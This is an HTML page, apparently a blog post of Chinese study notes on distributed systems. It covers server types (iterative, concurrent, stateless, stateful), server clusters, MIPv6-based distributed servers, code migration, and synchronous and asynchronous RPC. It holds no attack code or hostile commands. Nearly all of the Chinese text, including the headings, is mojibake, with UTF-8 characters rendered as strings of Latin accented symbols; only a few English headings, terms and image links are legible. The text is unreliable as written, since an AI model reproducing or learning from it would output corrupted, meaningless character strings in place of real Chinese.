<h2 id="æœåŠ¡å™¨"><a href="#æœåŠ¡å™¨" class="headerlink" title="æœåŠ¡å™¨"></a>æœåŠ¡å™¨</h2><ul>
<li><p><strong>è¿­ä»£æœåŠ¡å™¨</strong></p>
<p>è‡ªå·±å¤„ç†è¯·æ±‚ï¼Œå¹¶ä¸”åœ¨å¿…è¦çš„æƒ…å†µä¸‹å°†å“åº”è¿”å›ç»™å‘å‡ºè¯·æ±‚çš„å®¢æˆ·ã€‚</p>
<p>ä¸€æ¬¡åªèƒ½å¤„ç†<strong>ä¸€ä¸ª</strong>å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè€Œå¹¶å‘æœåŠ¡å™¨ä¸åŒã€‚</p>
</li>
<li><p><strong>å¹¶å‘æœåŠ¡å™¨</strong></p>
<p>å¹¶ä¸è‡ªå·±å¤„ç†è¯·æ±‚ï¼Œè€Œæ˜¯å°†è¯·æ±‚ä¼ é€’ç»™æŸä¸ªç‹¬ç«‹çº¿ç¨‹æˆ–è€…å…¶ä»–è¿›ç¨‹æ¥å¤„ç†ï¼Œè‡ªèº«ç«‹å³è¿”å›å¹¶ç­‰å¾…ä¸‹ä¸€ä¸ªè¾“å…¥çš„è¯·æ±‚ã€‚</p>
</li>
<li><p><strong>è¶…çº§æœåŠ¡å™¨</strong></p>
<p>è´Ÿè´£ç›‘å¬æ‰€æœ‰ä¸è¿™äº›æœåŠ¡å…³è”çš„ç«¯ç‚¹ï¼Œå½“æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™ï¼Œå®ƒæ´¾ç”Ÿå‡ºä¸€ä¸ªè¿›ç¨‹å·²å¯¹è¯¥è¯·æ±‚è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ï¼Œè¿™ä¸ªæ´¾ç”Ÿå‡ºçš„è¿›ç¨‹åœ¨å¤„ç†å®Œæ¯•åå°†ä¼šè‡ªåŠ¨é€€å‡ºè¿è¡Œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451757.png" alt="img"></p>
</li>
<li><p><strong>çŠ¶æ€æ— å…³æœåŠ¡å™¨</strong></p>
<p>ä¸ä¿å­˜å™¨å®¢æˆ·çš„çŠ¶æ€ä¿¡æ¯ï¼Œè€Œä¸”ä¹Ÿä¸å°†è‡ªèº«çš„çŠ¶æ€å˜åŒ–å‘ŠçŸ¥ä»»ä½•å®¢æˆ·ã€‚</p>
<ul>
<li>ä¸è®°å½•æ–‡ä»¶æ˜¯å¦å·²ç»æ‰“å¼€(åªåœ¨è®¿é—®åå†æ¬¡å…³é—­æ–‡ä»¶)ï¼›</li>
<li>ä¸ä¸€å®šä¼šä½¿å¾—å®¢æˆ·çš„ç¼“å­˜å˜æ— æ•ˆï¼›</li>
<li>ä¸è·Ÿè¸ªå®¢æˆ·è¡Œä¸ºã€‚</li>
</ul>
<p>åæœï¼š</p>
<ul>
<li>å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯å®Œå…¨ç‹¬ç«‹ï¼›</li>
<li>é<strong>æ— çŠ¶æ€æœåŠ¡å™¨</strong>çš„æƒ…å†µä¸‹ï¼Œç”±äºå®¢æˆ·æˆ–è€…æœåŠ¡å™¨ç«¯æŸä¸€æ–¹å‘ç”Ÿå´©æºƒï¼Œä»è€Œå¯¼è‡´åŒæ–¹çŠ¶æ€ä¸ä¸€è‡´ã€‚è€Œåœ¨æ— çŠ¶æ€æœåŠ¡å™¨ä¸­ï¼Œå› ä¸ºæ˜¯æ— çŠ¶æ€çš„ï¼Œè¿™ç§çŠ¶æ€ä¸ä¸€è‡´çš„æƒ…å†µå¤§å¤§å‡å°äº†ï¼›</li>
<li>å› ä¸ºæŸäº›åŸå› æ€§èƒ½å¯èƒ½ä¼šæœ‰æ‰€é™ä½ï¼Œä¾‹å¦‚æœåŠ¡å™¨æ— æ³•é¢„æµ‹å®¢æˆ·çš„è¡Œä¸º(æ¯”å¦‚é¢„å–æ–‡ä»¶å—)ã€‚</li>
</ul>
</li>
<li><p>çŠ¶æ€ç›¸å…³æœåŠ¡å™¨</p>
<p>è·Ÿè¸ªå®¢æˆ·çš„çŠ¶æ€ï¼Œä¸€ç›´ä¿ç•™å®¢æˆ·ç«¯çš„ä¿¡æ¯ç›´åˆ°è¢«æ˜¾å¼åˆ é™¤ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>è®°å½•æ–‡ä»¶å·²è¢«æ‰“å¼€ï¼Œä»¥ä¾¿å¯ä»¥è¿›è¡Œé¢„å–ï¼›</li>
<li>çŸ¥é“å®¢æˆ·ç«¯ç¼“å­˜äº†å“ªäº›æ•°æ®ï¼Œå¹¶å…è®¸å®¢æˆ·ç«¯ä¿ç•™å…±äº«æ•°æ®çš„æœ¬åœ°å‰¯æœ¬</li>
</ul>
<p>å¦‚æœå…è®¸å®¢æˆ·ç«¯ä¿ç•™æœ¬åœ°å‰¯æœ¬ï¼Œåˆ™å¯ä»¥æå‡è¯»å†™æ“ä½œçš„æ€§èƒ½ã€‚</p>
<p>ç¼ºé™·ï¼š</p>
<ul>
<li>å¦‚æœæœåŠ¡å™¨å´©æºƒï¼Œé‚£ä¹ˆå¿…é¡»å°†è‡ªèº«çš„æ•´ä¸ªçŠ¶æ€æ¢å¤åˆ°å´©æºƒä¹‹å‰ã€‚ä½†æ˜¯å¦‚æœé‡‡ç”¨çŠ¶æ€æ— å…³è®¾è®¡ï¼Œå°±ä¸éœ€è¦é‡‡å–ä»»ä½•ç‰¹æ®Šæªæ–½æ¥ä½¿å´©æºƒçš„æœåŠ¡å™¨æ¢å¤ã€‚</li>
</ul>
</li>
<li><p>Cookies</p>
<p>Cookiesæ˜¯ä¸€å°æ®µæ•°æ®ï¼Œå…¶ä¸­åŒ…å«æœ‰å¯¹æœåŠ¡å™¨æœ‰ç”¨çš„é’ˆå¯¹ç‰¹å®šå®¢æˆ·çš„ä¿¡æ¯ã€‚æµè§ˆå™¨æœ¬èº«æ°¸è¿œä¸ä¼šæ‰§è¡Œcookieï¼Œå®ƒåªå¯¹cookieè¿›è¡Œå­˜å‚¨ã€‚</p>
<p>Cookieså¯ç”¨äºå°†å½“å‰å®¢æˆ·ç«¯æ“ä½œä¸å…ˆå‰æ“ä½œç›¸å…³è”ï¼Œä¹Ÿå¯ç”¨äºçŠ¶æ€çš„å­˜å‚¨ã€‚</p>
</li>
</ul>
<h3 id="æœåŠ¡å™¨é›†ç¾¤"><a href="#æœåŠ¡å™¨é›†ç¾¤" class="headerlink" title="æœåŠ¡å™¨é›†ç¾¤"></a>æœåŠ¡å™¨é›†ç¾¤</h3><h4 id="å¸¸è§çš„ç»„ç»‡"><a href="#å¸¸è§çš„ç»„ç»‡" class="headerlink" title="å¸¸è§çš„ç»„ç»‡"></a>å¸¸è§çš„ç»„ç»‡</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451758.png" alt="img"></p>
<p>æœåŠ¡å™¨é›†ç¾¤é€»è¾‘ä¸Šç”±ä¸‰å±‚ç»„æˆã€‚</p>
<ul>
<li>ç¬¬ä¸€å±‚ï¼šï¼ˆé€»è¾‘ä¸Šçš„ï¼‰äº¤æ¢æœºï¼Œç”±å®ƒåˆ†é…å®¢æˆ·è¯·æ±‚ç»™æœåŠ¡å™¨ï¼›</li>
<li>ç¬¬äºŒå±‚ï¼šåº”ç”¨è®¡ç®—æœåŠ¡å™¨ï¼Œæ˜¯ä¸“ç”¨äºæä¾›è®¡ç®—èƒ½åŠ›çš„æœåŠ¡å™¨ï¼›</li>
<li>ç¬¬ä¸‰å±‚ï¼šæ–‡ä»¶å’Œæ•°æ®åº“æœåŠ¡å™¨ï¼Œæ˜¯åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿæˆ–åˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿã€‚</li>
</ul>
<p>äº¤æ¢æœºå½¢æˆäº†é›†ç¾¤å…¥å£ï¼Œæä¾›äº†å”¯ä¸€çš„ç½‘ç»œåœ°å€ã€‚</p>
<p>ä¸€ç§æ ‡å‡†çš„å­˜å–æœåŠ¡å™¨é›†ç¾¤çš„æ–¹å¼æ˜¯å»ºç«‹ä¸€ä¸ªTCPè¿æ¥ï¼Œåœ¨è¿™ä¹‹ä¸Šåº”ç”¨çº§åˆ«çš„è¯·æ±‚å¯ä½œä¸ºä¸€ä¸ªä¼šè¯çš„ä¸€éƒ¨åˆ†æ¥å‘é€ï¼Œæ’¤é™¤è¿æ¥å¯ç»“æŸä¼šè¯ã€‚åœ¨ä¼ è¾“å±‚äº¤æ¢æœºçš„æƒ…å†µä¸‹ï¼Œäº¤æ¢æœºæ¥å—åˆ°æ¥çš„TCPè¿æ¥è¯·æ±‚ï¼Œè½¬å‘è¿™äº›è¯·æ±‚ç»™ä¸€å°æœåŠ¡å™¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451759.png" alt="img"></p>
<p>å½“äº¤æ¢æœºæ”¶åˆ°ä¸€ä¸ªTCPè¿æ¥è¯·æ±‚æ—¶ï¼Œä»–å°±æ‰¾åˆ°å¤„ç†è¿™ä¸ªè¯·æ±‚çš„æœ€ä½³æœåŠ¡å™¨ï¼Œå¹¶è½¬å‘è¿™ä¸ªè¯·æ±‚åŒ…ç»™è¿™ä¸ªæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åè¿‡æ¥ä¼šå‘é€ä¸€ä¸ªåº”ç­”ç»™è¯·æ±‚çš„å®¢æˆ·ï¼Œä½†æŠŠäº¤æ¢æœºçš„IPåœ°å€æ’å…¥åˆ°æ‰¿è½½TCPæ•°æ®æ®µçš„IPåŒ…å¤´çš„åŸåœ°å€åŸŸã€‚(çœ‹ä¸Šå»æ˜¯æœåŠ¡å™¨æ¬ºéª—å®¢æˆ·è‡ªå·±æ˜¯äº¤æ¢æœºï¼Œä½†æ˜¯å®¢æˆ·ç­‰å¾…çš„æ˜¯äº¤æ¢æœºçš„åº”ç­”ï¼Œè€Œä¸æ˜¯æŸä¸ªä¸çŸ¥åçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥è¿™ç§æ¬ºéª—æ˜¯å¿…é¡»çš„ã€‚ä»è€Œå¯ä»¥çœ‹å‡ºï¼Œå®ç°TCPè½¬å‘éœ€è¦æ“ä½œç³»ç»Ÿçº§åˆ«çš„ä¿®æ”¹)</p>
<h4 id="åˆ†å¸ƒå¼æœåŠ¡å™¨"><a href="#åˆ†å¸ƒå¼æœåŠ¡å™¨" class="headerlink" title="åˆ†å¸ƒå¼æœåŠ¡å™¨"></a>åˆ†å¸ƒå¼æœåŠ¡å™¨</h4><blockquote>
<p>åˆ†å¸ƒå¼æœåŠ¡å™¨æŒ‡å¯åŠ¨æ€å˜åŒ–çš„ä¸€ä¸ªæœºå™¨ç¾¤ï¼Œå®ƒçš„è®¿é—®ç‚¹ä¹Ÿå¯ä»¥å˜åŒ–ï¼Œä½†å¯¹å¤–å´è¡¨ç°ä¸ºä¸€å¼ºæœ‰åŠ›çš„å•å°æœºå™¨ã€‚</p>
</blockquote>
<p>å¦‚ä½•åœ¨è¿™æ ·çš„ç³»ç»Ÿä¸­å®ç°ä¸€ä¸ªç¨³å®šè®¿é—®ç‚¹ï¼Ÿ</p>
<p>ä¸»è¦æ€æƒ³æ˜¯åˆ©ç”¨å¯ç”¨çš„ç½‘ç»œæœåŠ¡ï¼Œæ¯”å¦‚IPç‰ˆæœ¬6çš„ç§»åŠ¨æ”¯æŒ(MIPv6)ã€‚åœ¨MIPv6ä¸­ï¼Œä¸€ä¸ªç§»åŠ¨ç»“ç‚¹å‡è®¾æœ‰ä¸€ä¸ª<strong>å®¿ä¸»ç½‘ç»œ</strong>ï¼Œé€šå¸¸å¾…åœ¨è¿™ä¸ªç½‘ç»œä¸­ï¼Œå¹¶æœ‰ç¨³å®šçš„åœ°å€ï¼Œç§°ä¸º<strong>å®¿ä¸»åœ°å€</strong>ã€‚</p>
<p>å®¿ä¸»ç½‘ç»œæœ‰ä¸€ä¸ªç‰¹åˆ«çš„è·¯ç”±å™¨ï¼Œç§°ä¸º<strong>å®¿ä¸»ä»£ç†</strong>ã€‚å½“ç§»åŠ¨èŠ‚ç‚¹é™„ç€åˆ°ä¸€ä¸ªå¤–éƒ¨ç½‘ç»œæ—¶ï¼Œå®ƒä¼šæ”¶åˆ°ä¸€ä¸´æ—¶<strong>éœ€è¦çš„åœ°å€</strong>ï¼Œå…¶ä»–ç»“ç‚¹å¯ä»¥å‘é€ç½‘ç»œåŒ…ç»™è¿™ä¸ªåœ°å€ã€‚è¿™ä¸ªä¸´æ—¶åœ°å€é€šå‘Šç»™å®¿ä¸»ä»£ç†ï¼Œå®ƒéšåå°±å¯ä»¥è½¬å‘é€ç»™ç§»åŠ¨èŠ‚ç‚¹çš„ç½‘ç»œåŒ…åˆ°è¿™ä¸ªä¸´æ—¶åœ°å€ã€‚</p>
<p>åœ¨åˆ†å¸ƒå¼æœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œç»™é›†ç¾¤åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„è”ç³»åœ°å€ï¼ˆæœåŠ¡å™¨ç”Ÿå‘½å‘¨æœŸå†…å’Œå¤–ç•Œé€šä¿¡çš„åœ°å€ï¼‰ï¼Œä»»ä½•æ—¶å€™åˆ†å¸ƒå¼æœåŠ¡å™¨éƒ½æœ‰ä¸€èŠ‚ç‚¹ä½œä¸ºè”ç³»åœ°å€çš„è®¿é—®ç‚¹ï¼Œè¿™ä¸ªè§’è‰²å¯ä»¥å®¹æ˜“è¢«å¦ä¸€ç»“ç‚¹å–ä»£ã€‚è®¿é—®ç‚¹åœ¨åˆ†å¸ƒå¼æœåŠ¡å™¨æ‰€åœ¨ç½‘ç»œçš„å®¿ä¸»ä»£ç†æ³¨å†Œè‡ªå·±çš„åœ°å€ä¸ºä¸´æ—¶åœ°å€ã€‚è¿™æ˜¯æ‰€æœ‰çš„ç½‘ç»œåŒ…éƒ½ä¼šå¯¼å‘è®¿é—®ç‚¹ï¼Œä»–ç„¶ååˆ†é…è¯·æ±‚ç»™å½“å‰å‚ä¸åˆ†å¸ƒå¼æœåŠ¡å™¨çš„ç»“ç‚¹ã€‚è‹¥è®¿é—®ç‚¹å¤±æ•ˆï¼Œä¸€ä¸ªç®€å•å®¹é”™æœºåˆ¶å¯åŠ¨ï¼Œå¦ä¸€ä¸ªè®¿é—®ç‚¹ä¼šé€‰å‡ºå¹¶æ³¨å†Œä¸€ä¸ªæ–°çš„ä¸´æ—¶åœ°å€ã€‚</p>
<p>è¿™ä¸ªé…ç½®ä¼šä½¿å¾—å®¿ä¸»ä»£ç†å’Œè®¿é—®ç‚¹ç§°ä¸ºç“¶é¢ˆï¼Œå› ä¸ºè¿™æ ·æ‰€æœ‰çš„æµé‡éƒ½è¦æµç»è¿™ä¸¤å°æœºå™¨ï¼Œå¯ä»¥ä½¿ç”¨MIPv6çš„<strong>è·¯å¾„ä¼˜åŒ–</strong>ï¼ˆè§ä¸‹å›¾ï¼‰ï¼š</p>
<ol>
<li>å®¢æˆ·çŸ¥é“æœåŠ¡å™¨çš„åœ°å€æ˜¯HAï¼ŒæŠŠè¯·æ±‚ä¼ ç»™HAï¼›</li>
<li>æœåŠ¡å™¨çš„å®¿ä¸»ä»£ç†æŠŠè¯·æ±‚è½¬å‘ç»™å½“å‰ä¸´æ—¶åœ°å€CAï¼›</li>
<li>å®¿ä¸»ä»£ç†è½¬å‘CAç»™å®¢æˆ·ï¼›</li>
<li>å®¢æˆ·æŠŠ(HA,CA)å­˜å‚¨åœ¨æœ¬åœ°ï¼Œä¹‹åé€šä¿¡ç›´æ¥é€ç»™CAã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451760.png" alt="img"></p>
<h2 id="ä»£ç è¿ç§»"><a href="#ä»£ç è¿ç§»" class="headerlink" title="ä»£ç è¿ç§»"></a>ä»£ç è¿ç§»</h2><p>ä»£ç è¿ç§»ä¼šå¸¦æ¥ä¸æœ¬åœ°èµ„æºä½¿ç”¨ç›¸å…³çš„é—®é¢˜ï¼Œå› ä¸ºè¿ç§»æ—¶è¦æ±‚èµ„æºåŒæ—¶è¿ç§»ï¼Œå¹¶ä¸”åœ¨ç›®æ ‡æœºå™¨ä¸Šé‡æ–°ç»‘å®šåˆ°æœ¬åœ°èµ„æºï¼Œæˆ–è€…ä½¿ç”¨ç³»ç»ŸèŒƒå›´çš„ç½‘ç»œå¼•ç”¨ã€‚</p>
<p>å¦ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œåœ¨è¿ç§»ä»£ç æ—¶è¦è€ƒè™‘å¼‚æ„æ€§ã€‚å¯ä»¥ä½¿ç”¨è™šæ‹Ÿæœºæ¥å¤„ç†å¼‚æ„æ€§ã€‚</p>
<h3 id="ä»£ç è¿ç§»æ¨¡å‹"><a href="#ä»£ç è¿ç§»æ¨¡å‹" class="headerlink" title="ä»£ç è¿ç§»æ¨¡å‹"></a>ä»£ç è¿ç§»æ¨¡å‹</h3><p>è¿›ç¨‹åŒ…å«å¦‚ä¸‹ä¸‰æ®µï¼š</p>
<ul>
<li>ä»£ç æ®µï¼ŒåŒ…å«æ„æˆæ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„æ‰€æœ‰æŒ‡ä»¤ï¼›</li>
<li>èµ„æºæ®µï¼ŒåŒ…å«æŒ‡å‘è¿›ç¨‹éœ€è¦çš„å¤–éƒ¨èµ„æºï¼ˆæ–‡ä»¶ã€æ‰“å°æœºã€è®¾å¤‡ç­‰ï¼‰çš„æŒ‡é’ˆï¼›</li>
<li>æ‰§è¡Œæ®µï¼Œç”¨æ¥å­˜å‚¨è¿›ç¨‹çš„å½“æœŸé‚£æ‰§è¡ŒçŠ¶æ€é‡ï¼ˆåŒ…æ‹¬ç§æœ‰æ•°æ®ã€æ ˆã€ç¨‹åºè®¡æ•°å™¨ç­‰ï¼‰ã€‚</li>
</ul>
<p><strong>å¼±å¯ç§»åŠ¨æ€§</strong>ï¼š</p>
<p>åªä¼ è¾“ä»£ç æ®µä»¥åŠæŸäº›åˆå§‹åŒ–æ•°æ®ã€‚ä¼ è¾“è¿‡æ¥çš„ç¨‹åºæ€»æ˜¯ä»é¢„å…ˆå®šä¹‰çš„å‡ ä¸ªä½ç½®ä¹‹ä¸€å¼€å§‹æ‰§è¡Œã€‚</p>
<p><strong>å¼ºå¯ç§»åŠ¨æ€§</strong>ï¼š</p>
<p>å¯ä»¥å…ˆåœæ­¢è¿è¡Œä¸­çš„è¿›ç¨‹ï¼Œç„¶åå°†å®ƒç§»åˆ°å¦ä¸€å°æœºå™¨ä¸Šå»ï¼Œå†ä»åˆšæ‰ä¸­æ–­çš„ä½ç½®ç»§ç»­æ‰§è¡Œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451761.png" alt="img"></p>
<h1 id="Chapter-4-é€šä¿¡-Communication"><a href="#Chapter-4-é€šä¿¡-Communication" class="headerlink" title="Chapter 4 é€šä¿¡ - Communication"></a>Chapter 4 é€šä¿¡ - Communication</h1><p><strong>è¿›ç¨‹é—´é€šä¿¡ - Interprocess Communication</strong></p>
<blockquote>
<p>è¿›ç¨‹é—´é€šä¿¡æ˜¯æ¯ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ ¸å¿ƒã€‚</p>
</blockquote>
<p>ä½†æ˜¯ï¼Œä¸åŒæœºå™¨çš„è¿›ç¨‹æƒ³ç›¸äº’äº¤æµæ˜¯å¾ˆå›°éš¾çš„ã€‚ </p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<p>ç›®å‰ä¸»è¦æœ‰å››ç§æ–¹æ³•ç”¨äºè¿›ç¨‹é—´é€šä¿¡ - IPC models:</p>
<ul>
<li>RPC</li>
<li>RMI</li>
<li>MOM</li>
<li>Streams</li>
</ul>
<h2 id="åˆ†å±‚åè®®-Layered-Protocols"><a href="#åˆ†å±‚åè®®-Layered-Protocols" class="headerlink" title="åˆ†å±‚åè®® - Layered Protocols"></a>åˆ†å±‚åè®® - Layered Protocols</h2><p>åˆ†å±‚åè®®å¯ä»¥è§£å†³é€šä¿¡çš„é—®é¢˜</p>
<h3 id="ä¸¤å¤§ç±»åè®®"><a href="#ä¸¤å¤§ç±»åè®®" class="headerlink" title="ä¸¤å¤§ç±»åè®®"></a>ä¸¤å¤§ç±»åè®®</h3><ul>
<li><p><strong>é¢å‘è¿æ¥</strong></p>
<p>æ¶ˆæ¯å‘é€ä¸æ¥æ”¶åŒæ–¹éœ€è¦å…ˆå»ºç«‹è¿æ¥ï¼Œå†ä¼ è¾“æ•°æ®ï¼›</p>
</li>
<li><p><strong>é¢å‘æ— è¿æ¥</strong></p>
<p>ç›´æ¥ä¼ æ•°æ®</p>
</li>
</ul>
<h3 id="ä¸­é—´ä»¶åè®®"><a href="#ä¸­é—´ä»¶åè®®" class="headerlink" title="ä¸­é—´ä»¶åè®®"></a>ä¸­é—´ä»¶åè®®</h3><p>ä¸­é—´ä»¶æ˜¯ä¸€ç§åº”ç”¨ç¨‹åºï¼Œé€»è¾‘ä¸Šä½äºåº”ç”¨å±‚ä¸­ã€‚</p>
<ul>
<li>ä¸­é—´ä»¶é€šä¿¡åè®®æ”¯æŒé«˜å±‚é€šä¿¡æœåŠ¡ï¼›</li>
<li>å¯¹å®æ—¶æ•°æ®ä¼ è¾“è¿›è¡Œè®¾å®šå¹¶ä½¿å…¶ä¿æŒåŒæ­¥çš„åè®®ï¼›</li>
<li>è¿˜æä¾›å¯é çš„å¤šæ’­æœåŠ¡ã€‚</li>
</ul>
<h2 id="è¿œç¨‹è¿‡ç¨‹è°ƒç”¨-Remote-Procedure-Call"><a href="#è¿œç¨‹è¿‡ç¨‹è°ƒç”¨-Remote-Procedure-Call" class="headerlink" title="è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ - Remote Procedure Call"></a>è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ - Remote Procedure Call</h2><p>RPCå°±æ˜¯ä¸€ä¸ªæœºå™¨è°ƒç”¨ä½äºå…¶ä»–æœºå™¨ä¸Šçš„è¿›ç¨‹ã€‚</p>
<p>Aæœºå™¨çš„è¿›ç¨‹è°ƒç”¨Bæœºå™¨çš„è¿›ç¨‹ï¼š</p>
<ol>
<li>Aå°†æœ¬åœ°è°ƒç”¨è¿›ç¨‹æŒ‚èµ·ï¼›</li>
<li>Aé€šè¿‡å‚æ•°å°†ä¿¡æ¯ä¼ é€’ç»™Bï¼›</li>
<li>Bæ‰§è¡Œè¢«è°ƒç”¨è¿›ç¨‹ï¼›</li>
<li>Bæ‰§è¡Œç»“æŸå°†ä¿¡æ¯ä¼ å›ç»™Aã€‚</li>
</ol>
<p>ä¸€èˆ¬è¯´çš„RPCå°±æ˜¯åŒæ­¥RPCï¼Œå¦‚ä¸Šé¢çš„æµç¨‹æ‰€ç¤ºï¼Œæœºå™¨Açš„è°ƒç”¨è¿›ç¨‹ï¼š</p>
<ul>
<li>æ— éœ€ä¿æŠ¤ç°åœºï¼›</li>
<li>åœ¨ç»“æœè¿”å›ä¹‹å‰ä¼šé˜»å¡çš„ã€‚</li>
</ul>
<h3 id="åŸºæœ¬çš„RPCæ“ä½œ-Basic-RPC-Operation"><a href="#åŸºæœ¬çš„RPCæ“ä½œ-Basic-RPC-Operation" class="headerlink" title="åŸºæœ¬çš„RPCæ“ä½œ - Basic RPC Operation"></a>åŸºæœ¬çš„RPCæ“ä½œ - Basic RPC Operation</h3><p>RPCæ“ä½œèƒŒåéšå«çš„æ€æƒ³æ˜¯å°½é‡æ˜¯<strong>è¿œç¨‹è¿‡ç¨‹è°ƒç”¨å…·æœ‰ä¸æœ¬åœ°è°ƒç”¨ç›¸åŒçš„å½¢å¼</strong>ã€‚</p>
<p>å°†å®¢æˆ·è¿‡ç¨‹å¯¹å®¢æˆ·å­˜æ ¹å‘å‡ºçš„æœ¬åœ°è°ƒç”¨è½¬æ¢æˆå¯¹æœåŠ¡å™¨è¿‡ç¨‹çš„æœ¬åœ°è°ƒç”¨ï¼Œè€Œå®¢æˆ·å’ŒæœåŠ¡å™¨éƒ½ä¸ä¼šæ„è¯†åˆ°æœ‰ä¸­é—´æ­¥éª¤çš„å­˜åœ¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451762.png" alt="img"></p>
<p>ä½¿ç”¨socketè¿›è¡Œé€šä¿¡ï¼ŒæŠŠsocketé€šä¿¡éšè—åˆ°åº•å±‚ï¼Œä»è€Œå®ç°é€æ˜æ€§ã€‚</p>
<p><strong>RPCçš„æ­¥éª¤</strong>ï¼š</p>
<p><strong>æ€»ç»“ä¸€ä¸‹å°±æ˜¯</strong>ï¼š</p>
<ol>
<li><p>å‘é€ï¼š</p>
<p>å®¢æˆ·è¿‡ç¨‹ -&gt; å®¢æˆ·å­˜æ ¹ -&gt; å®¢æˆ·æ“ä½œç³»ç»Ÿ -&gt; æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ -&gt; æœåŠ¡å™¨å­˜æ ¹ -&gt; æœåŠ¡å™¨è¿›ç¨‹</p>
</li>
<li><p>è¿”å›ï¼šä»å³å‘å·¦å°±æ˜¯äº†ã€‚</p>
</li>
</ol>
<p><strong>å…·ä½“</strong>ï¼š</p>
<ol>
<li>å®¢æˆ·è¿‡ç¨‹ä»¥æ­£å¸¸çš„æ–¹å¼è°ƒç”¨å®¢æˆ·å­˜æ ¹ï¼›</li>
<li>å®¢æˆ·å­˜æ ¹ç”Ÿæˆä¸€ä¸ªæ¶ˆæ¯ï¼Œç„¶åè°ƒç”¨æœ¬åœ°æ“ä½œç³»ç»Ÿï¼›</li>
<li>å®¢æˆ·ç«¯æ“ä½œç³»ç»Ÿå°†æ¶ˆæ¯å‘é€ç»™è¿œç¨‹æ“ä½œç³»ç»Ÿï¼›</li>
<li>è¿œç¨‹æ“ä½œç³»ç»Ÿå°†æ¶ˆæ¯äº¤ç»™æœåŠ¡å™¨å­˜æ ¹ï¼›</li>
<li>æœåŠ¡å™¨å­˜æ ¹å°†å‚æ•°æå–å‡ºæ¥ï¼Œç„¶åè°ƒç”¨æœåŠ¡å™¨ï¼›</li>
<li>æœåŠ¡å™¨æ‰§è¡Œè¦æ±‚çš„æ“ä½œï¼Œæ“ä½œå®Œæˆåå°†ç»“æœè¿”å›ç»™æœåŠ¡å™¨å­˜æ ¹ï¼›</li>
<li>æœåŠ¡å™¨å­˜æ ¹å°†ç»“æœæ‰“åŒ…æˆä¸€ä¸ªæ¶ˆæ¯ï¼Œç„¶åè°ƒç”¨æœ¬åœ°æ“ä½œç³»ç»Ÿï¼›</li>
<li>æœåŠ¡å™¨æ“ä½œç³»ç»Ÿå°†å«æœ‰ç»“æœçš„æ¶ˆæ¯å‘é€å›å®¢æˆ·ç«¯æ“ä½œç³»ç»Ÿï¼›</li>
<li>å®¢æˆ·ç«¯æ“ä½œç³»ç»Ÿå°†æ¶ˆæ¯äº¤ç»™å®¢æˆ·å­˜æ ¹ï¼›</li>
<li>å®¢æˆ·å­˜æ ¹å°†ç»“æœä»æ¶ˆæ¯ä¸­æå–å‡ºæ¥ï¼Œè¿”å›ç»™è°ƒç”¨ä»–çš„å®¢æˆ·è¿‡ç¨‹ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451763.png" alt="img"></p>
<h3 id="å‚æ•°ä¼ é€’-Parameter-Passing"><a href="#å‚æ•°ä¼ é€’-Parameter-Passing" class="headerlink" title="å‚æ•°ä¼ é€’ - Parameter Passing"></a>å‚æ•°ä¼ é€’ - Parameter Passing</h3><p>å®Œæ•´å®šä¹‰äº†RPCåè®®åï¼Œéœ€è¦å®ç°å®¢æˆ·å­˜æ ¹å’ŒæœåŠ¡å™¨å­˜æ ¹ï¼Œä¸åŒç‚¹ä»…ä»…åœ¨äºé¢å‘åº”ç”¨ç¨‹åºçš„æ¥å£ã€‚</p>
<p>æ¥å£é€šå¸¸ä½¿ç”¨<strong>IDL</strong>(æ¥å£å®šä¹‰è¯­è¨€)ï¼Œç”¨IDLè¯´æ˜çš„æ¥å£å¯ä»¥ä¸é€‚å½“çš„ç¼–è¯‘æ—¶æ¥å£æˆ–è€…è¿è¡Œæ—¶æ¥å£ä¸€èµ·ç¼–è¯‘åˆ°å®¢æˆ·å­˜æ ¹è¿‡ç¨‹å’ŒæœåŠ¡å™¨å­˜æ ¹ä¸­ã€‚</p>
<h3 id="å¼‚æ­¥RPC-Variations"><a href="#å¼‚æ­¥RPC-Variations" class="headerlink" title="å¼‚æ­¥RPC - Variations"></a>å¼‚æ­¥RPC - Variations</h3><p><strong>å¼‚æ­¥RPCä¸­ï¼š</strong></p>
<ul>
<li>å®¢æˆ·å‘å‡ºRPCè¯·æ±‚ï¼Œæ¥å—åˆ°æœåŠ¡å™¨çš„ç¡®è®¤ä¿¡æ¯åï¼Œä¸ä¼šé˜»å¡ï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œï¼›</li>
<li>æœåŠ¡å™¨åœ¨æ¥å—åˆ°RPCè¯·æ±‚åç«‹å³å‘å®¢æˆ·é€å›åº”ç­”ï¼Œä¹‹åå†è°ƒç”¨å®¢æˆ·è¯·æ±‚çš„è¿‡ç¨‹ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451764.png" alt="img"></p>
